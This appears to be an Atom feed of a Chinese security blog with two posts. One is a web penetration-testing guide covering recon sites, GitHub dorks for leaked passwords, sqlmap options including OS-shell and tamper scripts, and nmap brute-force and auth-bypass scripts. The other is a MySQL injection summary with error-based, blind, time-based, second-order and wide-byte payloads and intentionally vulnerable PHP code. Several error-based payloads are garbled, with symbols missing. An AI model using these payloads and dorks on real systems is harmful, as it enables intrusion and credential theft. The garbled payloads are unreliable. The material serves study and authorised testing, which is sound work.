<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Jrand-github.github.io</id>
    <title>F1n_blog</title>
    <updated>2021-07-15T03:22:37.829Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://Jrand-github.github.io"/>
    <link rel="self" href="https://Jrand-github.github.io/atom.xml"/>
    <subtitle>每个人都在过着别人羡慕的生活</subtitle>
    <logo>https://Jrand-github.github.io/images/avatar.png</logo>
    <icon>https://Jrand-github.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, F1n_blog</rights>
    <entry>
        <title type="html"><![CDATA[WEB渗透测试指南]]></title>
        <id>https://Jrand-github.github.io/post/web-shen-tou-ce-shi-zhi-nan/</id>
        <link href="https://Jrand-github.github.io/post/web-shen-tou-ce-shi-zhi-nan/">
        </link>
        <updated>2021-07-15T03:06:52.000Z</updated>
        <content type="html"><![CDATA[<h1 id="web安全攻防渗透测试实战指南">WEB安全攻防渗透测试实战指南</h1>
<h2 id="被动信息收集">被动信息收集</h2>
<h3 id="域名信息收集">域名信息收集</h3>
<h4 id="whois查询">Whois查询</h4>
<p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p>
<p><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p>
<h4 id="根域名收集备案">根域名收集（备案）</h4>
<p>ICP备案查询：<a href="http://www.beianbeian.com">http://www.beianbeian.com</a></p>
<p>天眼查：<a href="http://www.tianyancha.com">http://www.tianyancha.com</a></p>
<h4 id="子域名收集">子域名收集</h4>
<p>OneForAll <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>ksubdomain：<a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p>
<p>子域名查询 <a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p>
<p>第三方聚合应用枚举 <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p>证书透明度公开日志枚举 <a href="http://crt.sh">http://crt.sh</a></p>
<p>子域名爆破：<br>
sublist3r、subdomainsBurte、DiscoverSubdomain、layer子域名挖掘机。</p>
<p>OneForAll:<a href="https://e.coding.net/randhome/ctf/CTFTOOLS-OneForAll.git">https://e.coding.net/randhome/ctf/CTFTOOLS-OneForAll.git</a></p>
<h4 id="dns">DNS</h4>
<p>https://viewdns.info/</p>
<h4 id="查找真实ip">查找真实IP</h4>
<ul>
<li>
<p>目标服务器存在CDN</p>
<p>内部邮件源</p>
<p>扫描网站测试文件</p>
<p>分站域名</p>
<p>国外访问<a href="https://asm.ca.com/en.ping.php">https://asm.ca.com/en.ping.php</a></p>
<p>全球ping<a href="http://ping.chinaz.com/m.pahx.com">http://ping.chinaz.com/m.pahx.com</a></p>
<p>查询域名的解析记录<a href="https://www.netcraft.com">https://www.netcraft.com</a></p>
<p>APP抓包</p>
<p>绕过CloudFlare CDN查找真实IP</p>
<p><a href="http://www.crimeflare.us/cfs.html#box">http://www.crimeflare.us/cfs.html#box</a></p>
<p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>
</li>
<li>
<p>目标服务器不存在CDNhttp://www.ip138.com</p>
<p>可用来找真实ip</p>
<p><a href="http://www.siteinfotool.com/">http://www.siteinfotool.com/</a></p>
<p><a href="http://toolbar.netcraft.com/site_report">http://toolbar.netcraft.com/site_report</a></p>
<p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<p><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p>
<p><a href="https://asm.ca.com/">https://asm.ca.com/</a></p>
<p>fofa搜索http shodan规则</p>
<p>fofa：<a href="https://search.sxisa.com/favicon.ico">https://search.sxisa.com/favicon.ico</a></p>
<p>shodan = http.favicon.hash:-935203314</p>
</li>
</ul>
<h4 id="同ip网站查询">同IP网站查询</h4>
<p><a href="http://www.ip-address.org/reverse-lookup/reverse-ip.php">http://www.ip-address.org/reverse-lookup/reverse-ip.php</a><br>
<a href="http://www.yougetsignal.com/tools/web-sites-on-web-server/">http://www.yougetsignal.com/tools/web-sites-on-web-server/</a></p>
<p>旁站/C段查询</p>
<p><a href="https://phpinfo.me/bing.php">https://phpinfo.me/bing.php</a></p>
<p><a href="https://chapangzhan.com">https://chapangzhan.com</a></p>
<p><a href="http://www.webscan.cc">http://www.webscan.cc</a></p>
<p><a href="http://www.5kik.com">http://www.5kik.com</a></p>
<p><a href="http://phpinfo.me">http://phpinfo.me</a></p>
<h3 id="指纹识别">指纹识别</h3>
<p>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p>云悉指纹：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<p>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
<p>潮汐安全团队<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p>
<h3 id="威胁情报分析">威胁情报分析</h3>
<h4 id="联网设备查询">联网设备查询</h4>
<ul>
<li>
<p>通过对全网扫描</p>
<p>360QuaKe**<a href="https://quake.360.cn/quake/welcome">https://quake.360.cn/quake/welcome</a>**</p>
<p>fofa <a href="https://fofa.so/">https://fofa.so/</a></p>
<p>shodan <a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>钟馗之眼 <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
</li>
</ul>
<h4 id="公众号小程序情报">公众号小程序情报</h4>
<p><a href="http://www.gsdata.cn">http://www.gsdata.cn</a></p>
<p><a href="https://newrank.cn/">https://newrank.cn/</a></p>
<h4 id="敏感目录文件收集">敏感目录文件收集</h4>
<ul>
<li>nikto</li>
<li>dirsearch</li>
<li>备份文件-test404</li>
<li>猪猪侠weakfilescan、cansina、sensitivefilescan、FileSensor</li>
</ul>
<h4 id="谷歌高级搜索">谷歌高级搜索</h4>
<p>谷歌黑客</p>
<p><a href="https://pentest-tools.com/information-gathering/google-hacking#">https://pentest-tools.com/information-gathering/google-hacking#</a></p>
<p><a href="https://scan.top15.cn/web/">https://scan.top15.cn/web/</a></p>
<p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<p>google hacking</p>
<ul>
<li>指定域名：<br>
site:xxx.com</li>
<li>URL中存在关键字的网页：<br>
inurl:admin</li>
<li>网页正文中的关键字：<br>
intext:admin</li>
<li>指定文件类型：<br>
Filetype:PDF</li>
<li>网页标题中的关键字：<br>
intitle:管理员</li>
<li>返回所有与xxx.com做了链接的URL：link</li>
<li>查找指定站点的一些基本信息：Info</li>
<li>搜索Google里关于某些内容的缓存：cache</li>
</ul>
<p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<pre><code>site:*.example.org ext:php | ext:txt | ext:log
</code></pre>
<pre><code>site:*.example.org ext:pdf | ext:doc| ext:docx | ext:ppt | ext:pptx | ext:xls | ext:xlsx | ext:csv
</code></pre>
<pre><code>site:edu.cn ext:doc title:身份证
</code></pre>
<p>通过Github获取数据库泄露信息。</p>
<pre><code>site:Github.com sa password

site:Github.com root password

site:Github.com User ID='sa'
</code></pre>
<p>使用Github获取邮件配置信息泄露的信息</p>
<pre><code>site:Github.com smtp @qq.com
site:Github.com smtp
</code></pre>
<h4 id="js拓展信息面">JS拓展信息面</h4>
<p>js爬取域名，url链接</p>
<p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
<h2 id="主动信息收集">主动信息收集</h2>
<h3 id="常用端口信息收集">常用端口信息收集</h3>
<ul>
<li>Nmap</li>
<li>无状态端口扫描工具Masscan</li>
<li>ZMap</li>
<li>御剑高速TCP端口扫描工具</li>
</ul>
<h2 id="漏洞环境搭建">漏洞环境搭建</h2>
<h3 id="linux安装lanmp">Linux安装LANMP</h3>
<ul>
<li>wget  http://dl.wdlinux.cn/files/lanmp_v3.tar.gz</li>
</ul>
<h3 id="windows安装wamp">Windows安装WAMP</h3>
<ul>
<li>
<p>下载链接：<br>
https://sourceforge.net/projects/wampserver/</p>
</li>
<li>
<p>安装报错</p>
<p>找不到MSVCR110.dll</p>
<p>https://www.zhaodll.com/dll/softdown.asp?softid=41552&amp;iz2=2a9db44a3a7e2d7f65f2c100b6662097</p>
</li>
</ul>
<h2 id="常用渗透测试工具">常用渗透测试工具</h2>
<h3 id="sqlmap">SQLMap</h3>
<ul>
<li>
<p>五种漏洞检测技术</p>
<ul>
<li>
<p>基于布尔类型的盲注</p>
<ul>
<li>可以根据返回页面判断条件真假</li>
</ul>
</li>
<li>
<p>基于时间的盲注</p>
<ul>
<li>不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行(即页面返回时间是否增加)来判断。</li>
</ul>
</li>
<li>
<p>基于报错的注入</p>
<ul>
<li>页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</li>
</ul>
</li>
<li>
<p>联合查询注入</p>
<ul>
<li>在可以使用Union的情况下注入</li>
</ul>
</li>
<li>
<p>堆查询注入</p>
<ul>
<li>可以同时执行多条语句时的注入</li>
</ul>
</li>
</ul>
</li>
<li>
<p>常用选项</p>
<ul>
<li>-u            指定URL<br>
-r            从文本中获取HTTP请求<br>
--dbs    查询当前用户下的所有数据库<br>
--tables  获取数据库的表名<br>
--columns  获取表中的字段名<br>
--dump       获取字段内容<br>
--users         获取数据库的所有用户<br>
--passwords   获取数据库用户的密码<br>
--current-db    获取当前数据库的名称<br>
--current-user   获取当前网站数据库的用户名称<br>
--level                   探测等级<br>
--is-dba                当前用户是否为管理员权限<br>
--relos                   列出数据库管理员角色<br>
--referer               指定请求的Referer头<br>
--sql-shell            运行自定义SQL语句<br>
--os-cmd  --os-shell        运行任意操作系统命令<br>
--file-read            从数据库服务器中读取文件<br>
--file-write   --file-dest   上传文件到数据库服务器中</li>
</ul>
</li>
<li>
<p>使用方法</p>
<ul>
<li>sqlmap.py   -u   &quot;http://xxx.com/1.php?id=1&quot;           检测注入点<br>
sqlmap .py  -u    &quot;http://xxx.com/1.php?id=1&quot;    --dbs   查询当前用户下的所有数据库<br>
sqlmap.py   -u    &quot;http://xxx.com/1.php?id=1&quot;   --D  xxx --tables   获取xxx数据库中的表名<br>
sqlmap.py  -u  &quot;http://xxx.com/1.php?id=1 &quot;    -D   XXX   -T   xxxx     获取xxxx表中的字段名<br>
sqlmap.py  -u  &quot;http://xxx.com/1.php?id-1&quot;     -D    XXX   -T   xxx   -C xxx  --dump   获取字段内容</li>
</ul>
</li>
<li>
<p>tamper脚本</p>
<ul>
<li>
<p>apostrophemask.py</p>
<ul>
<li>作用:将引号替换为UTF-8,用于过滤单引号</li>
</ul>
</li>
<li>
<p>base64encode.py</p>
<ul>
<li>作用：替换成base64编码</li>
</ul>
</li>
<li>
<p>multiplespaces.py</p>
<ul>
<li>作用：围绕SQL关键字添加多个空格</li>
</ul>
</li>
<li>
<p>space2plus.py</p>
<ul>
<li>作用：用+号替换空格</li>
</ul>
</li>
<li>
<p>nonrecursivereplacement.py</p>
<ul>
<li>作用：将空格替换为其他有效字符</li>
</ul>
</li>
<li>
<p>unionalltounion.py</p>
<ul>
<li>作用：将UNION ALL SELECT替换为UNION  SELECT</li>
</ul>
</li>
<li>
<p>securesphere.py</p>
<ul>
<li>作用：追加特制的字符串</li>
</ul>
</li>
<li>
<p>space2mssqlblank.py（mssql)</p>
<ul>
<li>作用：将空格替换为其他空字符</li>
</ul>
</li>
<li>
<p>space2mssqlhash.py</p>
<ul>
<li>作用：将空格替换为#号，并添加一个换行符</li>
</ul>
</li>
<li>
<p>between.py</p>
<ul>
<li>作用：用NOT BETWEEN 0 AND替换大于号（&gt;),用BETWEEN AND 替换等号(=)</li>
</ul>
</li>
<li>
<p>percentage.py</p>
<ul>
<li>作用：ASP允许在每个字符前面添加一个%符号</li>
</ul>
</li>
<li>
<p>sp_password.py</p>
<ul>
<li>作用：从DBMS日志的自动模糊处理的有效载荷中追加sp_password</li>
</ul>
</li>
<li>
<p>charencode.py</p>
<ul>
<li>作用：对给定的Payload全部字符使用URL编码（不处理已经编码的字符）</li>
</ul>
</li>
<li>
<p>randomcase.py</p>
<ul>
<li>作用：随机大小写</li>
</ul>
</li>
<li>
<p>charunicodeencode.py</p>
<ul>
<li>作用：字符串unicode编码</li>
</ul>
</li>
<li>
<p>space2comment.py</p>
<ul>
<li>作用：将空格替换为/**/</li>
</ul>
</li>
<li>
<p>equaltolike.py</p>
<ul>
<li>作用：将等号替换为like</li>
</ul>
</li>
<li>
<p>greatest.py</p>
<ul>
<li>作用：绕过对&quot;&gt;&quot;的过滤，用于GREATEST替换大于号</li>
</ul>
</li>
<li>
<p>ifnull2ilsnull.py</p>
<ul>
<li>作用：绕过对IFNULL的过滤，替换类似IFNULL（A，B）为IF（ISNULL（A），B，A）。</li>
</ul>
</li>
<li>
<p>modsecurityversioned.py</p>
<ul>
<li>作用：过滤空格，使用MYSQL内联注释的方式进行注入</li>
</ul>
</li>
<li>
<p>space2mysqlblank.py</p>
<ul>
<li>作用：将空格替换为其他空白字符（使用于MYSQL）</li>
</ul>
</li>
<li>
<p>modsecurityzeroversioned.py</p>
<ul>
<li>作用：使用Mysql内联注释的方式（/<em>!00000</em>/）进行注入</li>
</ul>
</li>
<li>
<p>space2mysqldash.py</p>
<ul>
<li>作用：将空格替换为——，并添加一个换行符</li>
</ul>
</li>
<li>
<p>bluecoat.py</p>
<ul>
<li>作用：在SQL语句之后用有效的随机空白字符替换空格符，随后用LIKE替换等于号</li>
</ul>
</li>
<li>
<p>versionedkeywords.py</p>
<ul>
<li>作用：注释绕过</li>
</ul>
</li>
<li>
<p>space2morehash.py</p>
<ul>
<li>作用：将空格替换为#号，并添加一个随机字符串和换行符</li>
</ul>
</li>
<li>
<p>apostrophenullendoce.py</p>
<ul>
<li>作用：用非法双字节unicode字符替换单引号</li>
</ul>
</li>
<li>
<p>appendnullbyte.py</p>
<ul>
<li>作用：在有效负荷的结束位置加载零字节字符编号</li>
</ul>
</li>
<li>
<p>chardoubleencode.py</p>
<ul>
<li>作用：对给定的Payload全部字符使用双重URL编码（不处理已经编码的字符)</li>
</ul>
</li>
<li>
<p>unmagicquotes.py</p>
<ul>
<li>作用：用一个多字节组合(%bf%27)和末尾通用注释一起替换空格</li>
</ul>
</li>
<li>
<p>randomcomments.py</p>
<ul>
<li>作用：用/**/分割SQL关键字</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="burpsuite">Burpsuite</h3>
<ul>
<li>
<p>Proxy</p>
<ul>
<li>Forward表示将拦截的数据包发送至数据库</li>
<li>Drop表示丢弃当前拦截的数据包</li>
<li>Interception  is  on表示开启拦截功能,单击后变为interception  is  off，表示关闭拦截功能</li>
<li>action按钮，可以将数据包进一步发送到Spider、Scanner、Repeater、Intruder等功能组件</li>
</ul>
</li>
<li>
<p>Spider</p>
</li>
<li>
<p>Decoder</p>
<ul>
<li>
<p>编码解码</p>
<ul>
<li>URL</li>
<li>HTML</li>
<li>Base64</li>
<li>ASCII</li>
<li>十六进制</li>
<li>八进制</li>
<li>二进制</li>
<li>GZIP</li>
</ul>
</li>
<li>
<p>Hash散列</p>
<ul>
<li>SHA</li>
<li>SHA-224</li>
<li>SHA-256</li>
<li>SHA-384</li>
<li>SHA-512</li>
<li>MD2</li>
<li>MD5</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Scanner</p>
<ul>
<li>
<p>主动扫描</p>
<ul>
<li>客户端漏洞，如XSS、HTTP头注入、操作重定向</li>
<li>服务端漏洞，如SQL注入、命令行注入、文件遍历</li>
</ul>
</li>
<li>
<p>被动扫描</p>
<ul>
<li>提交的密码为为加密的明文</li>
<li>不安全的cookie的属性，例如缺少httpOnly和安全标志</li>
<li>Cookie的范围缺失</li>
<li>跨域脚本包含和站点引用泄漏</li>
<li>表单值自动填充，尤其是密码</li>
<li>SSL保护的内容缓存</li>
<li>目录遍历</li>
<li>提交密码后应答延迟</li>
<li>session令牌的不安全传输</li>
<li>敏感信息泄漏，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄漏</li>
<li>不安全的ViewState的配置</li>
<li>错误或不规范的Content-Type</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Intruder</p>
<ul>
<li>
<p>标识符枚举</p>
<ul>
<li>WEB应用程序经常使用标识符引用用户、帐号、资产等数据信息。例如，用户名、文件ID和帐号号码</li>
</ul>
</li>
<li>
<p>提取有用的数据</p>
<ul>
<li>在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其他个人空间名字和年龄</li>
</ul>
</li>
<li>
<p>模糊测试</p>
<ul>
<li>很多输入型的漏洞（如SQL注入、跨站点脚本和文件路径遍历）可以通过请求参数提交各种测试字符串,并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload，通过Burpsuite Intruder自动化对WEB应用程序进行模糊测试</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Repeater</p>
</li>
<li>
<p>Comparer</p>
<ul>
<li>枚举用户名的过程中，对比分析登录成功和失败时，服务器反馈的结果区别</li>
<li>使用Intruder进行攻击时，对于不同的服务端相应，可以很快分析出两次响应的区别在哪里。</li>
<li>进行SQL注入盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系</li>
</ul>
</li>
<li>
<p>Sequencer</p>
</li>
</ul>
<h3 id="masscan">masscan</h3>
<h3 id="nmap">Nmap</h3>
<ul>
<li>
<p>特点</p>
<ul>
<li>主机探测</li>
<li>端口扫描</li>
<li>版本检测</li>
<li>系统检测</li>
<li>支持探测脚本的编写</li>
</ul>
</li>
<li>
<p>常用方法</p>
<ul>
<li>
<p>扫描单个目标地址</p>
<ul>
<li>nmap   192.168.0.100</li>
</ul>
</li>
<li>
<p>扫描多个目标地址</p>
<ul>
<li>nmap  192.168.0.100  192.168.0.105</li>
</ul>
</li>
<li>
<p>扫描一个范围内的目标地址</p>
<ul>
<li>nmap  192.168.0.100-110</li>
</ul>
</li>
<li>
<p>扫描目标地址所在的某个网段</p>
<ul>
<li>nmap  192.168.0.100/24</li>
</ul>
</li>
<li>
<p>扫描主机列表targets.txt中的所有目标地址</p>
<ul>
<li>nmap    -iL   targets.txt</li>
</ul>
</li>
<li>
<p>扫描除某一个目标地址之外的所有目标地址</p>
<ul>
<li>nmap   192.168.0.100/24  -exclude  192.168.0.105</li>
</ul>
</li>
<li>
<p>扫描除某一文件中的目标地址之外的目标地址</p>
<ul>
<li>nmap  192.168.0.100/24  --exclude  targets.txt</li>
</ul>
</li>
<li>
<p>扫描某一目标的21、22、23、80端口</p>
<ul>
<li>nmap  192.168.0.100  -p  21,22,23,80</li>
</ul>
</li>
<li>
<p>对目标地址进行路由跟踪</p>
<ul>
<li>nmap   --traceroute   192.168.0.110</li>
</ul>
</li>
<li>
<p>扫描目标地址所在C段的在线状况</p>
<ul>
<li>nmap   -sP  192.168.0.100/24</li>
</ul>
</li>
<li>
<p>目标地址的操作系统指纹识别</p>
<ul>
<li>nmap    -O  192.168.0.105</li>
</ul>
</li>
<li>
<p>目标地址提供的服务版本探测</p>
<ul>
<li>nmap   -sV  192.168.0.105</li>
</ul>
</li>
<li>
<p>探测防火墙状态</p>
<ul>
<li>nmap  -sF  -T4  192.168.0.105</li>
</ul>
</li>
</ul>
</li>
<li>
<p>状态识别</p>
<ul>
<li>
<p>open</p>
<ul>
<li>开放的，表示应用程序正在监听该端口的连接，外部可以访问</li>
</ul>
</li>
<li>
<p>filtered</p>
<ul>
<li>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</li>
</ul>
</li>
<li>
<p>closed</p>
<ul>
<li>关闭的，表示目标主机未开启该端口</li>
</ul>
</li>
<li>
<p>unfiltered</p>
<ul>
<li>未被过滤的，表示nmap无法确定端口所处的状态，需进一步探测</li>
</ul>
</li>
<li>
<p>open/filtered</p>
<ul>
<li>开放的或被过滤的，Nmap无法识别</li>
</ul>
</li>
<li>
<p>closed/filtered</p>
<ul>
<li>关闭的或被过滤的，Nmap无法识别</li>
</ul>
</li>
</ul>
</li>
<li>
<p>脚本类型</p>
<ul>
<li>
<p>Auth</p>
<ul>
<li>负责处理鉴权证书（绕过鉴权）的脚本</li>
</ul>
</li>
<li>
<p>Broadcast</p>
<ul>
<li>在局域网中探查更多服务的开启情况，如DHCP/DNS/Sqlserver等</li>
</ul>
</li>
<li>
<p>Brute</p>
<ul>
<li>针对常见的应用提供暴力破解方式，如HTTP/SMTP</li>
</ul>
</li>
<li>
<p>Default</p>
<ul>
<li>使用-sC或-A选项扫描时默认的脚本，提供基本的脚本扫描能力</li>
</ul>
</li>
<li>
<p>Discoverty</p>
<ul>
<li>对网络进行更多信息的搜集，如SMB枚举、SNmp查询等。</li>
</ul>
</li>
<li>
<p>Dos</p>
<ul>
<li>用于进行拒绝服务攻击</li>
</ul>
</li>
<li>
<p>Exploit</p>
<ul>
<li>利用已知的漏洞入侵系统</li>
</ul>
</li>
<li>
<p>External</p>
<ul>
<li>利用第三方的数据库或资源。例如，进行Whois解析。</li>
</ul>
</li>
<li>
<p>Fuzzer</p>
<ul>
<li>模糊测试脚本，发送异常的包到目标机，探测出潜在的漏洞</li>
</ul>
</li>
<li>
<p>Intrusive</p>
<ul>
<li>入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li>
</ul>
</li>
<li>
<p>Malware</p>
<ul>
<li>探测目标机是否感染病毒、开启后门等信息</li>
</ul>
</li>
<li>
<p>Safe</p>
<ul>
<li>此类与Intrusive相反，属于安全性脚本</li>
</ul>
</li>
<li>
<p>Version</p>
<ul>
<li>负责增强服务与版本扫描功能的脚本</li>
</ul>
</li>
<li>
<p>Vuln</p>
<ul>
<li>负责检查目标机是否有常见的漏洞，如MS-08-067</li>
</ul>
</li>
</ul>
</li>
<li>
<p>常用脚本使用方法</p>
<ul>
<li>
<p>鉴权扫描</p>
<ul>
<li>nmap   --script=auth  192.168.0.105</li>
</ul>
</li>
<li>
<p>暴力破解攻击</p>
<ul>
<li>nmap   --script=brute   192.168.0.105</li>
</ul>
</li>
<li>
<p>扫描常见的漏洞</p>
<ul>
<li>nmap   -script=vuln  192.168.0.105</li>
</ul>
</li>
<li>
<p>应用服务扫描</p>
<ul>
<li>nmap   --script=realvnc-auth-bypass  192.168.0.105</li>
</ul>
</li>
<li>
<p>探测局域网内更多服务开启的情况</p>
<ul>
<li>nmap  -n  -p  445   --script=broadcast  192.168.0.105</li>
</ul>
</li>
<li>
<p>Whois查询</p>
<ul>
<li>nmap   --script=external   xxx.com</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mysql注入漏洞]]></title>
        <id>https://Jrand-github.github.io/post/mysql-zhu-ru-lou-dong/</id>
        <link href="https://Jrand-github.github.io/post/mysql-zhu-ru-lou-dong/">
        </link>
        <updated>2021-07-12T16:13:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql注入漏洞总结">mySQL注入漏洞总结</h1>
<p>https://blog.csdn.net/weixin_32334681/article/details/113301274</p>
<h2 id="联合查询">联合查询</h2>
<p>确认注入类型</p>
<p>数字型：select name,age from admin where id =$id</p>
<p>字符型：select name,age from admin where id =’$id’</p>
<p>若是数字</p>
<p>id =1+1 若返回页面不是id=1的 判断为数字型</p>
<p>万能方法：</p>
<p>‘—%20 若正常则为字符型 反之则为数字型</p>
<p>总结根据多次数据库测试</p>
<p>select * from admin where id =1 —%20 正常</p>
<p>select * from admin where id =’1 —%20’ 正常</p>
<p>猜测语句</p>
<pre><code>%23 --+ #
')%23 &quot;)%23 
</code></pre>
<h2 id="报错注入">报错注入</h2>
<p>原理分析<br>
https://www.cnblogs.com/Triomphe/p/9489639.html</p>
<p>12种报错注入+万能语句</p>
<pre><code class="language-sql">1、通过floor报错,注入语句如下:
and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);

2、通过ExtractValue报错,注入语句如下:
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3、通过UpdateXml报错,注入语句如下:
and 1=(updatexml(1,concat(0x3a,(select user())),1))

4、通过NAME_CONST报错,注入语句如下:
and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)

5、通过join报错,注入语句如下:
select * from(select * from mysql.user ajoin mysql.user b)c;

6、通过exp报错,注入语句如下:
and exp(~(select * from (select user () ) a) );

7、通过GeometryCollection()报错,注入语句如下:
and GeometryCollection(()select *from(select user () )a)b );

8、通过polygon ()报错,注入语句如下:
and polygon (()select * from(select user ())a)b );

9、通过multipoint ()报错,注入语句如下:
and multipoint (()select * from(select user() )a)b );

10、通过multlinestring ()报错,注入语句如下:
and multlinestring (()select * from(selectuser () )a)b );

11、通过multpolygon ()报错,注入语句如下:
and multpolygon (()select * from(selectuser () )a)b );

12、通过linestring ()报错,注入语句如下:
and linestring (()select * from(select user() )a)b );
</code></pre>
<h2 id="布尔注入">布尔注入</h2>
<p>重点：正常情况一个页面，不正常情况另外一种页面而且不回显任何信息</p>
<p>正常<br>
select name from admin where id=1 if((select name from admin where id=1 limit 1,1),true,false)</p>
<p>变形<br>
select name from admin where id=1 and ord(mid(database(),1,1)&gt;100</p>
<h2 id="延时注入">延时注入</h2>
<p>重点：无论正常还是非正常参数都返回一个相同的页面<br>
基本函数<br>
延时：sleep（时间）<br>
判断：if(条件，true，false)<br>
截取：mid<br>
控制数量：<br>
转码：ord</p>
<pre><code>select name from admin where id=1 if(ord(mid((select name from admin where id=1 limit 1,1),1,1))&gt;97,sleep(5),0)
</code></pre>
<h2 id="搜索型注入">搜索型注入</h2>
<p>搜索型语句：</p>
<pre><code>select * from admin where name like '%$id%'
</code></pre>
<p>查询方法构造</p>
<p>‘%a’ //以a结尾的数据<br>
‘a%’ //以a开头的数据<br>
‘%a%’ //含有a的数据<br>
‘<em>a</em>‘ //三位且中间字母是a的<br>
‘<em>a’ //两位且结尾字母是a的‘a</em>‘ //两位且开头字母是a的<br>
关键：闭合语句使用联合查询</p>
<p>测试代码</p>
<pre><code class="language-php">&lt;?php 
$id = $_GET['id'];
$localhost = &quot;127.0.0.1&quot;;
$name=&quot;root&quot;;
$pass=&quot;root&quot;;
$dbname=&quot;bc&quot;;
$conn=mysqli_connect($localhost,$name,$pass,$dbname);
$sql = &quot;select * from admin where name like '%$id%'&quot;;
$result=mysqli_query($conn,$sql);
$text = mysqli_fetch_assoc($result);
$n=$text['name'];
$a=$text['age'];
echo $n;
echo &quot;&lt;br&gt;&quot;;
echo $sql;
 ?&gt;
</code></pre>
<h2 id="二次注入">二次注入</h2>
<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(''+data+'',2,10,'245435345345',now(),'qqpay',1)--+
</code></pre>
<p>无效语句</p>
<pre><code>insert into if_order(out_trade_no,gid,money,rel,benTime,type,number)values(eee',2,10,'245435345345',now(),'qqpay',1),((select user()),1,10,'111',now(),'wxpay',1)--+
</code></pre>
<p>正确语句</p>
<p>请后插 无法拼接</p>
<p>代码系统</p>
<pre><code class="language-php">&lt;?php 
$user = $_GET['name'];
$ed = $_GET['ed'];
$localhost = &quot;127.0.0.1&quot;;
$name=&quot;root&quot;;
$pass=&quot;root&quot;;
$dbname=&quot;bc&quot;;
$conn=mysqli_connect($localhost,$name,$pass,$dbname);
//显示所有的用户信息
//首先查询有多少条
$id=1;
while(1==1){
$sql = &quot;select * from admin where id=$id&quot;;
$result = mysqli_query($conn,$sql);
if($result){
$num = mysqli_fetch_assoc($result);
echo $num['name'];
echo &quot;&lt;br&gt;&quot;;
$id=$id+1;
}
else{
break;
}
}
$sql1 = &quot;insert into admin(id,name) values ($ed,$user)&quot;;
$result1 = mysqli_query($conn,$sql1);
if($result1){
echo &quot;&lt;script&gt;alert(\&quot;插入成功\&quot;)&lt;/script&gt;&quot;;
}
else{
echo &quot;&lt;script&gt;alert(\&quot;插入失败\&quot;)&lt;/script&gt;&quot;;
}
?&gt;
</code></pre>
<h2 id="宽字节注入">宽字节注入</h2>
<p>逃逸单引号</p>
<pre><code>mysql的数据库默认字符设置为SET NAMES GBK
</code></pre>
<p><strong>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</strong></p>
<p><strong>%df%27===&gt;(addslashes)<mark><mark>&gt;%df%5c%27</mark></mark>&gt;(GBK)====&gt;運’</strong></p>
<p><strong>用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</strong></p>
<pre><code>当一个Mysql连接请求从客户端传来的时候，服务器认为它的编码是character_set_client，
然后会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，
然后更新到数据库的时候，再转化成字段所对应的编码
如果使用了set names指令，那么可以修改character_set_connection的值，
也同时会修改character_set_client和character_set_results的值
当从数据库查询数据返回结果的时候，将字段从默认的编码转成character_set_results
</code></pre>
<p>修复：</p>
<p>（1）使用mysql_set_charset(GBK)指定字符集</p>
<p>（2）使用mysql_real_escape_string进行转义</p>
<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
<p>就是使用mysql_set_charset进行指定。</p>
<p>上述的两个条件是“与”运算的关系，少一条都不行。\</p>
